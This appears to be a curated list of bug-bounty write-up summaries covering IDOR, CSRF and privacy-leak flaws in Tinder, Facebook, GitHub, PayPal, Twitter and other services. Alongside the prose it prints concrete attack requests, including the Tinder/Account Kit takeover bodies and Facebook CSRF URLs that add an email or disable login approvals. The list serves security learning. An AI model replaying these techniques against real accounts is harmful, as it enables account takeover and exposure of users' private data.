  - Both Tinder's web and mobile applications allow users to use their mobile phone numbers to log into the service. And this login service is provided by "Facebook Account Kit".
    - The user clicks on "Login with Phone Number" on `tinder.com` and then they are redirected to `AccountKit.com` for login. If the authentication is successful then "Account Kit" passes the "access token" to Tinder for login.
    - But the Tinder API was not checking the "client ID" on the token provided by "Account Kit". This enabled the attacker to use any other app's "access token" provided by "Account Kit" to take over the real "Tinder accounts" of other users.
  - The attacker would log into victim's "Account Kit account" by entering the victim's "phone number" in `new_phone_number` in the API request.
    - POST request: `https://www.accountkit.com/update/async/phone/confirm/?dpr=2`
    - body: `new_phone_number=[vctim’s phone number]&update_request_code=c1fb2e919bb33a076a7c6fe4a9fbfa97[attacker’s request code]&confirmation_code=258822[attacker’s code]&__user=0&__a=1&__dyn=&__req=6&__be=-1&__pc=PHASED%3ADEFAULT&__rev=3496767&fb_dtsg=&jazoest=`
    - "Account Kit" was not verifying the mapping of the "phone numbers" with their one-time password. The attacker could enter anyone's "phone number" and then simply log into the victim's "Account Kit account".
  - Then the attacker could copy the victim's `aks` ("access token") of "Account Kit app" from cookies.
  - Now the attacker simply replays the following request using the copied "access toke" `aks` of victim into the Tinder API. They will be logged into the victim's "Tinder account". The attacker would then basically have full control over the victim's account.
    - POST request: `https://api.gotinder.com/v2/auth/login/accountkit?locale=en`
    - body: `{“token”:”xxx”,”id”:””}`
- [Add comment on a private Oculus Developer bug report](https://medium.com/bugbountywriteup/add-comment-on-a-private-oculus-developer-bug-report-93f35bc80b2c) by Sarmad Hassan
  - The author already tested oculus couple months ago but didn't find any bug on it, then he decided to test it again.
  - While poking around "Oculus Developer domain", the author noticed an option called "Report a Bug", where users can submit their bugs (not security bugs) to oculus support team. When he saw this option, he decided to test it.
    - Users can submit their bugs with two ways, public bugs and private bugs.
    - In public bugs, any one can add comments or reply to other comments.
    - In private bugs, no one can add comments except the owner of the bug and the support team.
    - Private bugs don't appears in the dashboard from other users perspective.
  - The author created public bug and added comment to his bug, after that he replied to his comment and intercepted the request with burpsuite:
    - POST request: `graph.oculus.com/graphql?locale=user`
    - body: `access_token=My-Acces-Token&variables={"input":{"client_mutation_id":"1","comment_parent_id":"556190998150906","external_post_id":"548709645565708","message":"what ever"}}&blablabla`
    - `comment_parent_id` refers to his "bug ID", `external_post_id` refers to "the ID of the comment" that he replied to it.
  - When he saw the above request, two plans came to his mand:
    - Plan A: he wanted to add comments on other users private bug by replacing his "bug ID" with their "bug ID". It didn't work.
    - Plan B: he wanted to add comments on other users private bug by replacing `external_post_id` value to other users value which is their "comment ID" in their private bug. Worked.
  - There was only one limitation in this bug, the question is how attacker can get other users "comment ID" from their private bugs since their bugs set as private and no one can see private bugs except the owner of the bug and the suppoert team.
    - It is hard to find that but not impossible, let's say someone was able to disclose other users "comment ID" or attacker can make a list for random "comment ID" and can perform a random attack and will add his comment on random private bug.
- [How I was able to generate Access Tokens for any Facebook user](https://medium.com/bugbountywriteup/how-i-was-able-to-generate-access-tokens-for-any-facebook-user-6b84392d0342) by Samm0uda
  - The author found this bug by mistake when he was testing some Facebook endpoints used in the "Rights Manger dashboard" which is a dashboard targeting videos' publishers and editors.
  - The vulnerable endpoint returns a page "Access Token" when making a POST request to it along with the parameter `page_id`. The issue here is that the endpoint didn't check if the provided value for the `page_id` was actually an ID of a "page" and not another object like "user". This allowed the author to make the request and change the `page_id` value to any "Facebook user ID" and as a response to this request he got the "Access Token" of that user.
  - Impact: Due to the state of the "Access Token" (the scopes of the generated "Access Token" are for pages and not users), the author wasn't able to read and modify some data about the user (like see messages) and he wasn't able to full takeover the account. Nevertheless, he was able to read all private information like emails, credit cards, phones number, managed pages and their "Access Tokens", managed business / ad-accounts and private posts, photos and videos.
- [Vulnerability in Youtube allowed moving comments from any video to another](https://www.secgeek.net/youtube-vulnerability/) by secgeek
  - The author wanted to think a little bit outside the box and find something in Youtube that not many bug hunters have tested, so he has decided to test the feature of "reviewing comments". Usually, the comments get posted immediately to the uploaded videos, but the author of the channel can control this by changing the settings to hold the comments for review before it gets posted. The author thought that not many researchers have tested that feature since it is not the default option.
  - When you approved the a comment on your video, a request containing `comment_id` and `video_id` (in the "POST" parameters) was generated. If you changed the `video_id` to any other video id, you would get an error. Yet, if you kept the `video_id` untouched and changed only the `comment_id` to any other comment id on any Youtube video, the request would get accepted and that comment would be copied and appear on you video.
  - The original comment from the original video didn't get removed, and the author of the commnent didn't get nonified that his comment is copied onto another video.

  - The author opened the reset password link, entered his new password, fired up Burpsuite and intercepted the requested when summitted. There was `id` (only seven number and I thought it was increasing) in the POST request, with no authorisation key. Changed `id` to the ID of victim's account, you could reset password of that victim's account. 
- [Using a GitHub app to escalate to an organization owner for a $10,000 bounty](https://medium.com/@cachemoney/using-a-github-app-to-escalate-to-an-organization-owner-for-a-10-000-bounty-4ec307168631) by Tanner
  - The author was able to leverage a GitHub app to escalate from an organization member to an account owner. Let's go over the simple user roles of a GitHub organization:
    - Outside collaborator (for completeness) - A role where you'r technically not part of the organization, but just given access to specific repositories inside.
    - Member - The lowest role you can have inside of an organization. Depending on the organization settings, you may be limited to viewing or having "write" access on a subset of repositories. The highest level of access you can be given with this permission is a "repository admin", which will allow changing most configuration settings for that specific repository.
    - Owner - The highest role you can have inside of an organization, which is basically the equivalent of a "super admin". This role allows you to view and edit all organization data and repositories; but more critically, irreversibly delete the entire organization and its code.
  - Organizations are widely used throughout Github, and the common assumption is that their members don't pose a threat when the proper access controls are in place (not giving "admin" access to every repository).
    - A common model is to put members into "teams", and use those to facilitate access control across repositories. Using this model, organization owners can be limited to a very small subset of users, since team-based controls are sufficient to give extended access where needed.
  - While going through the organization settings as an owner, the author noticed a "Third-party access policy" switch. The purpose of this setting is to prevent members of your organization from giving repository access to untrusted 3rd parties via OAuth.
    - Once enabled, a member must specifically request access from the OAuth permissions prompt, which then requires approval by an organization owner berfore it can access any organization data.
  - The next thing the author looked into was another kind of app, an integration. Integrations are similar to OAuth apps, except they act on behalf of the organization instead of the user.
    - His thought process was to check if the "Third-party access policy" would apply to integrations as well, or if those would slip through.
  - He navigated to the marketplace and went through the installation flow with a few apps. It was clear that as an organization member, you're not given the option to install the integration. You can only install integrations into your own account, or for organizations of which you're an owner. A note in the documentation: `Organization members can't request a GitHub App installation`.
    - While going through the installation flow, he noticed that after choosing a "Bill account" you're brought to a screen that has a URL: `https://github.com/apps/:app_name/installations/new/permissions?target_id=:id`.
    - The `target_id` is the `organization_id`, or the `account_id` where the app is to be installed. Naturally, as a member of another organization, he changed the `target_id` to that `organization_id`.
    - Since his "member account" was a repository admin, he was prompted with the "installation page". He was successfully able to install the app, but only to the one repository for which he had admin rights to.
  - The next day the author wanted to see if he could take this any further.
  - He created his own "GitHub integration, and noticed the permissions that could be requested were extremely sensitive. Particularly the permission to have "write" access to all organization members and teams.
    - Surely having the permission to install an integration into one repository won't allow him to grant "write" access to all of the organization's members, right? Incorrect.
    - Since the intended design is such that only owners can install integrations, having the permission is binary. The scopes you can grant aren't enforced, since you're already considered to have the highest level of access.
  - Then next step was to see if the API worked as expected, and if he was actually able to use it without running into a permissions error down the line.
    - He successfully messed around with a bunch of endpoints before landing on the holy grail. Add or update an organization membership with a `role` parameter. Using that endpoint, he was successfully able to invite another user into the organization as an account owner.
  - The good in this was that it was only able to be exploited by a repository admin. But after more investigation, the author found that all organizations that allow members to create repositories are vulnerable.
    - That's because a member is automatically given admin rights to any repository they create, allowing them to exploit this by just creating a dummy repository to intall the app into.
    - This feature is enabled by default, and it's common for organizations to leave it enabled since GitHub's payment model is no longer repository bound, but based on the number of users.
- [One Vulnerability allowed deleting comments of any user in all Yahoo sites](https://www.secgeek.net/yahoo-comments-vulnerability/) by secgeek
  - This vulnerability affected 90% of Yahoo's services such as: "Yahoo News", "Yahoo Sports", "Yahoo TV", "Yahoo Music", "Yahoo Weather", "Yahoo Celebrity", "Yahoo Voices" and more. The vulnerability allowed attacker to delete any user comments in all these Yahoo sites.
  - When you deleted your comment, a request containing `comment_id` (in POST parameters) was generated, if you changed the `comment_id` to the other's comment, you could delete other's comment.
  - The vulnerability would only work if you were the first commenter on the article as you would have a privilege to delete any other Yahoo users' comments who posted comments after you. Otherwise it would give you the "Authorization Failed" error message. So it seems that the developer was taking care of the bug but he just forgot to add the validation when he checks if you were the first commenter.
- [Yahoo! Luminate Internal Privilege Escalation — Admin to Owner](https://medium.com/@rojanrijal/luminate-internal-privilege-escalation-admin-to-owner-2ca28e575985) by Rojan Rijal
  - Luminate offers three different services in their platform: "Web Hosting", "Store CMS" and "Marketing". This was a vulnerability on "Web Hosting" service.
  - After buying Luminate's "Web Hosting" service, user is provided with multiple internal services: "Web Hosting (managing addons, installing softwares)", "Email service" and "Access manager".
    - In "Access manager", "Owner" can invite other users to help them manage the domain and its hosting.
    - Invited users can have either of two roles: "Administrators" or "Limited user" with access to tools that owner specifies.
  - Let User A be "Owner" and User B be "the invited Administrator".
  - Once user B is invited they have access to the "web hosting service", "access manager" and all other services except for payment information for the organization.
    - Through "access manager", User B can also invite other users and edit their profile. When editing the profile, they can only change their name but not their email or expiration date.
    - When the profile is saved, a POST requst containing `role_id` and `usera_id` was sent.
  - The author changed his `role_id` to be `Owner` instead of `Admin`. Once that was done, he was assigned to the role `Owner` by the system. However, because the default owner, user A, was still there, he didn't have "Owner permisions" yet.
  - Next goal was to remove the main owner. This however was protected because user A profile was protected from edits ever by User A themself.
  - While investigating further, the "user ids" for both User B and User A caught his attention. When he saved User B's profile, he could see the id of User A through the `creator` parameter. At the same time, User B's id was passed in two parameters: `yuid` and `profile_yuid`. So he decided to play around this and see if this could be modified to conduct a solid attack.

- [Twitter Vulnerability Couldv Delete Credit Cards from Any Twitter Account](https://www.secgeek.net/twitter-vulnerability/) by Ahmed Aboul-Ela
  - Acctually the author found two vulnerabilities not one but both had the same effect and impact. Endpoint `ads.twitter.com`.
  - First Vulnerability. When you pressed the "Delete this card" button in payments method page, a request containing `account` (the twitter account id) and `id` (the credit card id, only 6 numbers and it was increasing) in POST parameters was generated, changed those two parameters to victim's account id and credit card id, the page response was "403 forbbiden" but the credit card was actually deleted from the victim's account without any interaction.
  - Second Vulnerability. When the author tried to add an invalid credit card to his twitter account it displayed an error message "we were unable to approve the card you entered" and showed a "Dismiss" button. When pressed the "Dismiss" button, a request containing `id` (the credit card id, only 6 numbers and it was increasing) in POST parameters was generated, changed `id` to the victim's credit card id, the victim's credit card got deleted.
- [How I took control of your Twitter account (tweeting, viewing/deleting photos and other media)](http://www.anandpraka.sh/2017/05/how-i-took-control-of-your-twitter.html) by Anand Prakash
  - "Twitter Studio" (`studio.twitter.com`) was a new product, the author started looking for vulnerabilities after the launch.
  - All requests on `studio.twitter.com` were sending a parameter name `owner_id` which was twitter user id (publicly available and sequential). `owner_id` parameter was missing authorisation checks changing which allowed attacker to tack actions on behalf of other twitter users.
- [PayPal BBP - I could’ve deleted All SMC messages](https://blog.ayoubaitelmokhtar.com/2018/06/paypal-bbp-i-couldve-deleted-all-smc.html) by Ayoub AIT ELMOKHTAR
  - PayPal has created a "Message Center" for its customers, like most financial institutions provide. The "Message Center" gives PayPal the ability to communicate with you within the framework of a new mailbox inside your PayPal account. It also provides you with a way to validate customer service emails that you may consider suspicious. This way, you can trust that the communications you receive are from PayPal itself.
  - How it works: emails from PayPal will be put into the "Message Center", a notification will be sent to let you know that you have a message.
  - When deleted a message, a request containing `message_id` (like "38223655") without "CSRF token" was generated. By changing `message_id`, an attacker could delete victim's message.
  - The proc in this writeup is worth to study.
- [How I could change your eBay password](http://yasserali.com/how-i-could-change-your-ebay-password/) by Yaaser Ali
  - When generated a "Reset Password Link", `reqinput` was contained in the request (actually the `reqinput` was sent by the server in a hidden input field of the "enter user info" page). When you reset your password, the POST request containing this `reqinput` as "Secret". So you could reset other users' password by only kowning their registered email.
  - But the user have to click on the link sent to the email to the server to unlock the change password process and this is the only user interaction that has to be taken to make the attack succeed. After the user clicked on the "Reset Password Link", the attacker was able to change his password.
- [Full account Takeover via reset password function](https://medium.com/@khaled.hassan/full-account-takeover-via-reset-password-function-8b6ef15f346f) by Khaled Hassan
  - When the author changed his password via password reset URL, a request containing `email` in POST parameter without any password reset token or authorization token generated. By changing the `email` the author could reset other user's password and takeover that accout. But a interaction was needed.
  - This system worked as follows:
    - User A starts resetting password of User B.
    - User B receives the reset link and clicks on it.
    - The server now will allow the User A to change the password of User B through this endpoint because the reseting URL verification is done.
    - When the user clicks on the password reset, this means to the server that the user has clicked on the reset URL that he requested for but in fact he didn't, the attacker who is requested the password reset. And after this happens User B can change his password through this endpoint without the need for any authorization tokens.

  - While creating an account on "Zomato", a user can store his phone number, addresses, data of birth, link Instagram account, etc. In one of the API call, they were reflecting the data based on the `browser_id` parameter in the API request (how did the author figure out this?). Changing the `browser_id` sequentially resulted in data leakage of other Zomato users. The data leaked also had Instagram access token which sould be used to see priviate photos on Instagram of respective Zomato users.

  - Create an account on Hackster.io with email, then logout.
  - Try to login into that accoutn with Facebook autho of same email, this time Hackster.io ask the user that "We've found existing user account registered on same email, link this two accounts". The URL of that page contained `/users/authorization/<user_id>/edit`, `<user_id>` was just like "199994".
  - By changing the `<user_id>` to any other account, an attacker could link his Facebook account to victim's email and takeover victim's account on Hackster.io.

  - When the author saw that the program has been launch since September 2015, he really losted the interest to participate. But when he saw the resolved report were only 29, he thought "why not give it a try".
  - The author had a deep understand to the business logic.
  - By changing `payment_id` (changed from "4055809" to "4055311"), then automatically the system will generate the other user's booking number that could be used to enumerate the data that has the relation with those booking number.
- [IDOR User Account Takeover By Connecting My Facebook Account with victims Account](https://blog.securitybreached.org/2018/09/16/idor-account-takeover-using-facebook/) by Muhammad Khizer Javed
  - An IDOR issue in a Web where changing the "User ID" in Facebook auth callback linking request actually connected the author's "Facebook Account" to the "Victims Site Account", so by this he could get complete access to "User Account".
  - When the author tested a web app, he realised that the website idefified a user from a unique `_user_id`, the value for this ID was something like `aff20-33f3-4c8e-b3cb-77b2`. So he checked in which request this `_user_id` got passed and came accross Facebook auth callback linking request. Changed the `_user_id` to another user's account, the author could connect his Facebook account to another user's account and tookover that account.
  - But how an attacker got victim's `_user_id`. The author tested many public endpoints to check if any contained the `_user_id` but couldn't find any, then he opened an image shared by the user (victim) and opend the actual URL of the image, ita was hosted on an "S3 Bucket" and the image always had the `_user_id` in the URL.

  - When the author required his bill information, a request containing `recharge_number_2` (mobile number) and `recharge_number` (account number) in POST parameters was generated. By only changing `recharge_number` (account number), the author was able to fetch complete bill details of some other user associated with that account number.

  - Just like every online shopping website has the functionality of allowing the user to select the address where he wants to ship the product, Naaptol also has the same thing. When the author selected an address to ship the product, a request containing `addressId`  (like "17917835") was generated. By changing the `addressId` to some other number, the author was able to see full details of other user associated with that ID, which included sensitive information like victim's full name, complete address, mobile number etc.

  - The author usually test for IDOR's this way, by having one browser (usually Chrome) setup as "victim account" and another browser (usually Firefox) as the "attacker account", where he route everything throught Burp and check the responses after he change values here and there.
  - New Relic implemented an "internal API" which occured on both their "infrastructure product" (`infrastructure.newrelic.com`) and "alerts product" (`alerts.newrelic.com`). There were multiple version of the "internal API", the bug only worked on version 1.
  - The vulnerable endpoint contained "account number" which increases by 1 every time a new account is created. The application didn't ensure that the "account number" being requested through the "internal APT" GET request matched the "account number" of the authenticated user.

  - The author came across an interesting IDOR vulnerability that could aid him to read the complete chat of the users with the customer support team of an Online Travel company.
  - While browsing through a company's website, the author found an online chat forum, that allows customer to chat online with the support team to query about one's bookings, payments, refund, etc. That tricked him to extract user's sensitive data. The first thing that hit his mid was "how can a user read other users' chat".
  - When triggered the online chat functionality, a request:
    - `https://private.com/yconnect/messages/before/hari013903158/FL-132756/?callback=angular.callbacks._d&format=jsonp&size=50&userType=UT_CUST`
    - The response of the above request was the conversation messages exchanged during the chat.
  - While traversing more, he realized that: `hari013903158` was the "customer id", `FL-132756` came out to be the "chat id" chich on further analysis found to be incremental.
  - Found the valid "customer id". The author went back to the login page, profile section, to see if it can help, but nothing. Then he came "blog section" (traveller's blog page where people share their traveling stories). He opened on blog which was published by one user, he could see the "user id" in the URL itself.
  - Replaced the "customer id" in previous request and brute-forced "chat id". Done.
- [Simple IDOR to reject a to-be users invitation via their notification](https://medium.com/@absstbh/simple-idor-to-reject-a-to-be-users-invitation-via-their-notification-ae3b919b0fef) by Abss TBH
  - "WePay" allows an organization / individual create custom payment integration by creating custom application associated with the "WePay account". The platform also allows for collaborators to join in:
    - Moderators: They can add / remove users.
    - Members: They can just view and have no state-change privileges.
    - The "members" role was the least privileged, so the author thought of aiming for it first and then deviate to other roles.
  - The author tried to find if there were vulnerabilities when trying to define a state-changing action via a members account. But he couldn't find any. The requests performed actions based on "session" with "csrf-tokens" in place, meaning the application derives the user attributes from the "session" and then verifies if the user can or cannot define the state-changing action.
  - Just to try various things out, as the "admin" the author removed the "member" from the organization and added the member back again. He received a notification in the "members" account asking him to accept / reject the invitation.
    - A user when invited, accepts invitation to create an account but later has to confirm the account email by visiting the link in the confirmation email sent.
    - From this it is implied that the notifications are being sent without checking if the account is verified or not.
    - The invitation can be accepted / rejected via the email the original user receives or via their notification which is usually unguarded.
  - By being a low-privileged member who can see the invitees email as they are made visible to all the account members, the author just set-up one fake account and just change the email address to that of the invitee and accept / reject their invitation.

  - Ribose give the long "User ID" (the very complex "User ID" to be guessed, like "0b03d802–3e29–4564-xxxx-x1x1x1x1x1x1") that generated automatically when someone signing up their platform. But any user at this platform could see the other "User ID" when we try to visit a user.
  - When a user delete their own photo profile, automatically the system will send the "DELETE" method to the server with the "User ID" and `X-CSRF-Token`. In theory, it's not possible for attacker to delete other user's photo profile without the knowledge of victim's `X-CSRF-Token` that (should) restric to each session. But in this situation, by (only) changing the "User ID" into the victim's "User ID", then the deletion process still executed by the system.
  - When a user upload their own photo profile, authomatically the system will send the "POST" method to the server with the "User ID", `authentication_token` and `X-CSRF-Token`. In theory, it's not possible for attacker to upload the picture into other user's photo profile without the knowledge of victim's `authentication_token` and `X-CSRF-Token` that (should) restrict to each session. But in this situation, by (only) changing the "User ID" into the victim's "User ID", then the upload process still executed by the sytem.
  - Always try to change our "User ID" to another "User ID" (as long the victim's ID are easily predicted or could be found) even the targeted application has implemented the "CSRF Token" that commonly used for restrict the session.

### Cross-Site Request Forgery (CSRF)

- [10 Methods to Bypass Cross Site Request Forgery (CSRF)](https://haiderm.com/10-methods-to-bypass-cross-site-request-forgery-csrf/) by Haider Mahmood
  - Randomness of Anti-CSRF token
    - Sometimes the backend validation only checks for the length of the Anti-CSRF token for its validation, a quick check for this is to change one character of the token and repaly.
    - Often the Anti-CSRF token is composed of two parts, one of them remains static while the other one dynamic, if you remove the dynamic part of the token and send the request with only the static part, it often works thanks to poor back-end validation.
  - Exploiting poor implementation
    - Replay attacks, this simply means that attacker is able to use the same Anti-CSRF token for a number a request, by exploiting this issue attacker can simply use the same Anti-CSRF token in crafted HTML form for the attack.
    - Sometimes the application wouldn't even check if the Anti-CSRF token parameter is present in the request or not.
  - CSRF bypass by leveraging other vulnerabilities
    - One could obtain Anti-CSRF tokens leveraging XSS vulnerabilities, such attack works even if Anti-CSRF token is per request based.
    - In cases where cookie attributes are used to submit Anti-CSRF token, if a vulnerability in application allows an attacker to do "header injection", this would also lead to user supplied cookies, attacker can set its own CSRF values in cookie resulting in Anti-CSRF token bypass.
    - Verb tampering (coverting GET to POST and vice versa) is another way one could bypass CSRF.
- [How I bypassed Facebook CSRF Protection](https://blog.darabi.me/2015/04/bypass-facebook-csrf.html) by Pouya Darabi
  - Normally, `fb_dtsg` (anti-CSRF token) is supposed to get validated at server-side and if an action request doesn't contain that token, Facebook will drop that request withour any process on it.
  - When updated gray account to personal account, a request containing `account_id=XXXX` in URL and body in POST parameters was generated. Changed `account_id=XXXX` to `aaaa=XXXX`, the author could bypass Facebook CSRF protection (what was the logic behind the scene?).
  - All action could be used here, example list:
    - change language: `/ads/manage/home/?show_dialog_uri=/ajax/settings/account/language.php?new_language=fa_IR`
    - add email: `/ads/manage/home/?show_dialog_uri=/settings/email/add/submit/?new_email=pouya@darabi.me`
    - turn off login approval: `/ads/manage/home/?show_dialog_uri=/ajax/settings/security/approvals.php?just_enabled_approvals=0`
    - logout all mobile: `/ads/manage/home/?show_dialog_uri=/ajax/settings/mobile/lost_phone.php`
    - logout all sessions: `/ads/manage/home/?show_dialog_uri=/ajax/settings/security/sessions/stop_all.php`
  - The author couldn't change prefix after Facebook fixed this issue, `show_dialog_uri` should have prefix `/ads/manage/error/graydisabled/?`.
  - The author bypassed the fix with double encoding (`?` -> `%253F`), added email:
    - `https://www.facebook.com/ads/manage/home/?account_id&show_dialog_uri=%2Fads%2Fmanage%2Ferror%2Fgraydisabled%2F%253F%2F..%2F..%2F..%2F..%2F..%2Fsettings%2Femail%2Fadd%2Fsubmit%2F%3Fnew_email%3Dpouya%40darabi.me`
  - Facebook security fianlly removed `show_dialog_uri`.

  - A "continued flow lead ad" means the final step is completed on the advertiser's website. The "lead ad" will collect all of the data provided and pass it to a destination URL using a hash or POST request. This is valuable for flows where you need data that Facebook is unwilling to collect (e.g. password for creating an account).
  - Facebook's POST method was used in "continued flow" and `fb_dtsg` was added to every request.
  - Whenever a user creates "lead ad form", a JSON object contains data were sent to create endpoint. Fortunately the author found another endpint to get created forms as JSON.
    - Endpoint URL: `https://facebook.com/ajax/settings/timeline/review.php`, Body: `tag_approval_enabled=0`
    - Final URL: `https://facebook.com/ajax/settings/timeline/review.php?tag_approval_enabled=0&__a=1`
    - There was no server side check for the "Final URL".
- [Messenger.com CSRF that show you the steps when you check for CSRF](https://whitton.io/articles/messenger-site-wide-csrf/) by Jack Whitton
  - The way the author normally check for CSRF is as follows:
    - Perfrom the request without modifying the parameters, so we can see what the expected result is
    - Remove the CSRF token completely (in this case, the `fb_dtsg` parameter)
    - Modify one of the characters in the token (but keep the lenght the same)
    - Remove the value of the token (but leave the parameter in place)
    - Convert to a GET request
  - By submitting a request to change a setting without `fb_dtsg`, the author found that `fb_dtsg` was missing on every request on `www.messenger.com`.

  - The author decoded qrcode using [QrCode Decoder](https://zxing.org/w/decode.jspx) and got an URL.
  - Clicked "Allow Login" button and captured the request, then sent it to repeater while dropping the request too so that the code don't get expired. Changed the `fb_dtsg` value, the request got accepted.
  - The author then created a CSRF form, but the request got aborted.
  - He monitored all the request again to understand all the qrcode did. After 2 to 3 hours, he came to know that its important for the victim to open the link first so that the "fb server" could detect it as scanning the qrcode.

  - There are two different websites: `paypal.me` and `paypal.com`. On `paypal.me` you are able to manage a reduced list of settings for your page such as the picture displayed, the background color, etc. On `paypal.com` you are able to manage your personal information such as your address, phone number, etc, but also your profile picture. The same picture is used in both places.
  - The author didn't find any CSRF on `paypal.me`, but on `paypal.com`, he found out that when removing or editing the "CSRF token" (http header in that case) theree was no error and the profile picture was updated.
  - Using this vulnerability it was possible to update the profile picture of a `paypal.me` user without conset after him / her following your link.

- [Hacking PayPal Accounts with one click (Patched)](http://yasserali.com/hacking-paypal-accounts-with-one-click/) by Yasser Ali
  - The "CSRF token" that authenticate every single request made by the user which can be also found in the request body of every request with the parameter name "Auth" get changed with every request made by user for security measures. But after a deep investigation the author found out that the "CSRF Auth" is reusable for that specific user email address or username, this means if an attacker found any of these "CSRF Tokens", he can then make actions in the behalf of any logged in user.
  - The "CSRF Auth" verifies every single request of that user, so if an attacker not logged in tries to make a "send money" request then PayPal will ask the attacker to provide his email and password. The attacker provides the victim's email and any password, then captures the request, the request will contain a valid "CSRF Auth token" which is reusable and can authorise this specific user requests.
  - Through examination of the password change process, the author found that an attacker can not change the victim password without answering the "security question" set by user. Also the user himself can not change the security questions without entering the password.
  - After further investigation, the author noticed that the request of setting up the security questions which is initiated by the user while signing up is not password protected, and it could be reused to reset the security questions without providing the password. Hence, armed with the "CSRF Auth", an attacker can CSRF this process too and change the victim's "security questions".
  - At this point, an attacker can conduct a targeted CSRF attack against PayPal users and take a full control over their accounts.

  - The author went through "Update Profile" functionality and a request containing `_method=put` in POST parameters was generated. The mothod `put` suggested creating a new resource or replacing a representation of current resource with the requested data. By changing `put` into `delete`, account was delete, in actual there was no such functionality which allowed user to deactive his account.
  - Now the next challenge was to do the same thing but to other user's account. There were also `user_name` and `csrf_token` in POST parameters in previous request, by changing `user_name` to other user's and removing `csrf_token` value, the author could delete other user's account.

### Sensitive Information Exposure

- [FB users birth year disclosed via FB Timeline profile source code “data attribute”](https://medium.com/@rajsek/curiosity-and-passion-to-your-profession-might-lead-to-make-your-dream-come-true-7d9be3c6029a) by Raja Sekar Durairaj
  - The author could extract the "birth year" of any others irrespective of their privacy settings.
  - The author got a facebook birthday notification of his mentor. Somehow he got interests to know his mentor's age and then he searched for his mentor's birth year in facebook, it seems his mentor intentionally hide the "birth year" to others. The author's instict said that there should be some way to get his mentor's birth year, so he started analysing FB timeline.
  - Facebook is following some patter / order to display the post in timeline, the author started to look into the source code of the "birth timeline" post of his mentor.
  - The author noticed a bunch of few "junk number" in the souce code. Then he started explore those "junk numbers" and found the pattern in those numbers was: `"thid":"Fb_User_ID:306061129499414:32:126210600:157746600:Birth_Post_ID"`.
  - He guessed that `32:126210600:157746600` in the above strings might be a "UNIX representation of time" (how did he guess that?), so he decoded the string. Then he thought FB developer might trimmed the last few digits, so he started repeating the decoding process by appending zeros at the end. His third attempt gave him the exact "birth year" of his mentor.
    - This method probably could be used in other scene.
  - The author automated the process using google extension (there is a piece of Javacript code but no google extension example).
  - This bug was present in all FB platfroms (Android, Web, Mobile Web - `m.facebook.com`).

  - To comfirm the fix on the previous bug, the author tried to analyse on "Facebook mobile website" (`m.facebok.com`) timeline pattern.
  - `https://m.facebook.com/UserID/year/<actual Year>` gave the post and life time event happened in that timeline.
  - Changed the `<actual Year>` with victim's `UserID`, returned the victim's birth post on their birth year.

  - Facebook uses "graph API" to fetch the user data from their system. To monitor the "Facebook timeline API" behaviour, the author logged the request and response of the FB Android application in his system. And he found that "Facebook graph timeline API" is following some pattern to fetch user post from their system. Using the pattern attacker can disclose the "birth year" of any user in Facebook.
  - This method is not applicable for me at this time, just keep this series as a series.

  - "Facebook Graph Search" is smart search tool allows people to see what their friends are doing. "Graph Search" simply works on "Set Theory", so it is possible to fire queries which adhere to "Set Theory" and are successfully executed and make the search engine return result set back.
  - The author was able to fool "Facebook Graph Search" and bypass privacy restrictions and extract sensitive information about user's applications and pages. He was able to get `applications used` by any user, regardless of privacy settings set to `Only me` and also he was able to ge `Pages liked` by user, regardless of privacy settings set to `Only me`.
  - Intersection of two sets was handled properly and didn't show any private information using privacy `Only me` or other.
    - `https://www.facebook.com/search/me/apps-used/100002065051535/apps-used/intersect`, this took common-set (intersection) of `apps-used` by the author and `apps-used` by `100002065051535` and returned a result set.
  - Union of two sets exposed private data. Given an app's visibility is set to `Only me`, was till returned in result set.
    - `https://www.facebook.com/search/me/apps-used/100002065051535/apps-used/union`, this returned few applications which were used by the author or `100002065051535`.
  - On user profile, a user is allowed to like pages which are of categories Apps and games, Movies, TV shows, Music, Books, Sports, etc. These pages are sorted according to categories and are addressed as individual elements. Books, Music, Sports are different entities and each entity has an option of privacy, an user can select any privacy for any entity. The author was able to extract any user's personal information, regardless of privacy settings. It included `Books` he / she read, `Movies` he / she watched.

  - Your Instagram and Facebook accounts are somehow linked: it happens both if you sign up to Instagram using you Facebook acoout, also if you sign up to Instagram creating a new acount but using the same email you use in your Facebook accout (there are also other way Instagram links your new accout with an existing Facebook accout).
  - When you subscripe to Instagram, it will suggest you who to follow based on your Facebook friends.
  - Instagram used to enable all its feature to new users, before they have confirmed their email address. One of the features available before confirming the email address was the suggestion of who to follow based on the Facebook friends of the account Instagram automatically linked.
    - This made super easy to retrieve the Facebook's friend list of anyone who doesn't have an Instagram account. And since there are more than 2 billions Facebook accounts but just 800 millions Instagram accounts, it means that at least 1 billion and half accounts were vulnerable.

  - The author enumerated some Instagram subdomains, then pick up one, logged in the "Facebook login" and the login took him to the "main" `facebook.com` page and showed some debugs prompts and some tools and missing dependencies while he was scrolling in the new feeds.
  - This seems recon wins.
- [Facebook BugBounty — Disclosing page members](https://medium.com/@tnirmalz/facebook-bugbounty-disclosing-page-members-1178595cc520) by Nirmal Thapa
  - Because of some privacy reasons, identify of "page members" (admins / mods / analysts) is kept secret by Facebook and normal page visitors cannot find the details about these members. But the author found multiple ways to disclosed members of a "Facebook page".
  - "Get Messages" is available in "Facebook Pages" when uploading posts and stuffs. Mainly e-commerce and online shopping websites use this feature with one of their product, so whenever a visitor wants to know more about that particular product, they can simply click on "Send Message" button.
    - If clicked on "Send Message" button, "profile ID" of the creator was leaked in one of the responses coming from `https://x-edge-chat.facebook.com` (checked the response in Burpsuite).
  - The author sent a message to the page as a normal visitor, when he received a message from the page, response in Burpsuite revealed the "profile ID" of "page member" who replied the message.
- [Bypassing Google’s authentication to access their Internal Admin panels](https://medium.com/bugbountywriteup/bypassing-googles-fix-to-access-their-internal-admin-panels-12acd3d821e3) by Vishnu Prasad P G
  - The author found a bug in Google that enables anyone to access "the internal admin panel" of YouTube's Broadcasting Satellite & YouTube TV.
  - One day, while searching for new bugs in Google, the author got some of Google's IP addresses from some disclosure of their internal issues (he had no idea what to do with these IP addresses).
  - He checked the IP addresses and could understand that the list contained some internal Google IP also. Recently, a similar bug was reported by his friend regarding their internal IP and also another one by his another good friend who had found a subdomain with access to the admin panels.
    - However, these issues had already been fixed. And Google had also blocked the public access to these entire IP ranges.
    - But now, the author had some similar IP address and he somehow had to find a way to bypass this restriction.
  - As he kept thinking how to move forward, he asked himself: Why not ask Google about how to bypass Google's restriction.
    - Every article / blog / forum / comments he read told him that we need their proxy (Google Access Proxy) to access the IP addresses.
